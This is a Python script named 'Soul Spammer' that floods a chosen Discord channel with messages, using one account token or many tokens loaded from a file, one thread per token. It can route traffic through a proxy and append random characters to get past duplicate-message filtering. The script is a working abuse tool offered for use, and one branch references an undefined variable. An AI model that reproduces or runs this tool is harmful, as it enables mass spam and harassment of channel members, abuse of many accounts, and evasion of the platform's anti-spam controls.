import sys, time
def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)


try:
    import colorama, requests
except:
    sys.stdout.write("> ")
    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip install colorama requests")
    except:
        pass
    sys.stdout.write("> ")
    print015("Problem Maybe Fixed Now, Restart The Program")
    input("")
    exit()

colorama.init(autoreset=True)




import os, threading
def set_title():
  title = "Soul Spammer"
  try:
    import requests
    os.system(f"title - Made By .exe")
  except:
    os.system(f"title soul tool")
threading.Thread(target=set_title).start()




import threading, time, random

def single_spammer():
    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Enter Token: ")
        tokens = input("")
        r1 = requests.get('https://discord.com/api/v9/auth/login', headers={"Authorization": tokens})
        if "200" not in str(r1):
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Invalid Token")
        if "200" in str(r1):
            r = requests.get(f'https://discord.com/api/v9/invite/{invite_code}', headers={"Authorization": tokens})
            if "200" in str(r):
                break
            if "403" in str(r):
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Locked Token")
    
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Delay (0 For None): ")
            delay = input("")
            delay = float(delay)
            break
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Enter A Valid Choice")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Enter Msg To Spam: ")
    msg = input("")


    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Channel Id: ")
            channel = int(input(""))
            break
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Enter A Valid Choice")
    
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Amount Of Messages To Send: ")
            amount = int(input(""))
            break
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Enter A Valid Choice")
    headers = {
        "authorization": tokens
    }
    json = {
        "content": msg,
        "tts": False
    }
    done = 0
    while True:
        try:
            r = requests.post("https://discord.com/api/v9/channels/"+str(channel)+"/messages", headers=headers, json=json)
            r = str(r)
            if "200" in r:
                done = int(done) + 1
                print(f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(done)}{colorama.Fore.CYAN}/{colorama.Fore.RESET}{str(amount)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Succsesfully Sent Message In {colorama.Fore.CYAN + str(channel)}")
            else:
                sys.stdout.write(colorama.Fore.CYAN + "> ")
                print(f"Unknown Error{colorama.Fore.CYAN}/{colorama.Fore.RESET}Rate Limited")
        except:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print("Unknown Error")
        if str(done) == str(amount):
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print("Done Spamming")
            input("")
            exit()
        time.sleep(float(delay))



choices = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"]


fail = 0
def spammer(tokens, channel, msg, delay, proxy, ren):
    global sent, fail
    headers = {
        "authorization": tokens
    }

    while True:
        if ren == "n":
            json = {"content": msg,"tts": False}
        if ren == "y":
            json = {"content": msg+" | "+"".join(random.choices(choices, k=5)),"tts": False}




        try:
            if proxy == "":
                r = requests.post("https://discord.com/api/v9/channels/"+str(channel)+"/messages", headers=headers, json=json)
            if proxy != "":
                r = requests.post("https://discord.com/api/v9/channels/"+str(channel)+"/messages", headers=headers, json=json, proxies={"http": proxy, "https": proxy})

            r = str(r)
            if "200" in r:
                sent = int(sent) + 1
            else:
                fail = int(fail) + 1
        except:
            pass
        time.sleep(float(delay))


sent = 0

def reader():
    global sent, fail
    list = []
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Press Enter To Start Loading The Tokens")
    input("")
    file = open("tokens.txt", "r")
    tokens = file.readlines()
    file.close()
    er = 0
    for e in tokens:
        if "\n" in e:
            list.append(e[:-1])
        else:
            list.append(e)
        er = int(er) + 1
        print(f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(er)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Loaded Token")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print015("Done Loading Tokens")
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Delay (0 For None): ")
            delay = float(input(""))
            break
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Enter A Valid Choice")


    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Channel Id: ")
            channel = int(input(""))
            break
        except:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Enter A Valid Choice")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Enter Message To Spam: ")
    msg = input("")
    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Enter Proxy, Leave Blank For None: ")
        proxy = input("")
        if proxy == "":
            break
        else:
            try:
                requests.get("https://google.com", proxies={"http": proxy, "https": proxy})
                break
            except:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Could Not Connect To Proxy")

    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Want 5 Random Characters At End Of Message, (y/n): ")
        ren = input("")
        if ren == "y" or ren == "n":
            break
        else:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Enter A Valid Choice")

    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Press Enter To Start")
    input("")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print015("Sending Messages...")
    for tokens in list:
        threading.Thread(target=spammer, args=(tokens, channel, msg, delay,proxy,ren,)).start()
    amount = 0
    while True:
        for u in range(sent):
            amount = int(amount) + 1
            sent = int(sent) - 1
            print(f"{colorama.Fore.CYAN}[{colorama.Fore.RESET}{str(amount)}{colorama.Fore.CYAN}]{colorama.Fore.RESET} Succsesfully Sent Message In {colorama.Fore.CYAN + str(channel)}")
        for u in range(int(fail)):
            fail = int(fail) - 1
            print(f"{colorama.Fore.RED}[{colorama.Fore.RESET}-{colorama.Fore.RED}]{colorama.Fore.RESET} Failed To Send Message In {colorama.Fore.RED + str(channel)}")

    




    











while True:
    sys.stdout.write(colorama.Fore.CYAN + "1. ")
    print015("Single Token Spammer")
    sys.stdout.write(colorama.Fore.CYAN + "2. ")
    print015("Multi Token Spammer")
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    tools = input("")
    if tools == "1" or tools == "2":
        break
    else:
        print("Enter A Valid Choice")

if tools == "1":
    single_spammer()
if tools == "2":
    reader()
